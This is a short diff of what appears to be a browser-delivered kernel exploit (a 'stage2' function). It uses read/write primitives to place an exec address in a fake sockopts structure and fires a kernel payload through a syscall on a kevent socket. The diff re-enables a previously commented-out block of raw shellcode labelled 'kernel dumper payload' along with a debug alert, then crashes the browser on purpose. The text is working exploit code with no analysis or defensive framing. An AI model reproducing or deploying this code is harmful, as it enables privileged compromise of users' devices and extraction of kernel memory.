@@ -985,11 +985,11 @@ var stage2_ = function () {
 	p.write8(fake_sockopts.add32(0x18), exec_address);
 	//alert("kernel payload");
 	p.syscall(54, kevent_sock, 0x20001111, 0);
-	//alert("survived kernel hell, all is ok? 0x" + p.read8(errno_location)); //0x80808080
+	alert("survived kernel hell, all is ok? 0x" + p.read8(errno_location)); //0x80808080
 
 	
 	//kernel dumper payload | generic
-	/*
+	
 	exec_writer[0] = 0xAAAABF48;
 	exec_writer[1] = 0xAAAAAAAA;
 	exec_writer[2] = 0xC748AAAA;
@@ -1200,7 +1200,7 @@ var stage2_ = function () {
 
 
 	//alert("test - close browser");
-	*/
+	
 	p.write8(0, 0); //kill browser
 	while (true) {}
 }
